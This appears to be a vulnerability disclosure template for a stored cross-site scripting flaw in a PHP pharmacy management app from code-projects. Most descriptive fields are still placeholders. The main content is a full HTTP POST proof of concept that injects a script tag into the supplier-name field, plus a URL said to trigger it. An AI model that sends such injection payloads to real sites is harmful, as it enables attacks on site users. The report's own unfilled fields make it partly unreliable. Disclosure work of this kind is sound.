# PROG has VULN vulnerability in PAGE

## supplier 
https://code-projects.org/xxxxxxxx
## Vulnerability file
xxxxxxxx.php

## describe
xxxxxxxxxxxxxxxx

**Code analysis**    

xxxxxxxxxxxxxxx


## POC

```
POST /adicionar-fornecedor.php HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------343575567911858812221258670237
Content-Length: 1452
Origin: http://farmacia
Connection: close
Referer: http://farmacia/adicionar-fornecedor.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="nome"

<script>alert('xss');</script>
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cpf"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="inscricao"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="endereco"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="numero"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="bairro"

11
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cidade"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cep"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="uf"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="telefone"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="email"

1@outlook.com
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="acao"


-----------------------------343575567911858812221258670237--

```

IMAGE

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/adicionar-produto.php
```

**Result**

IMAGE
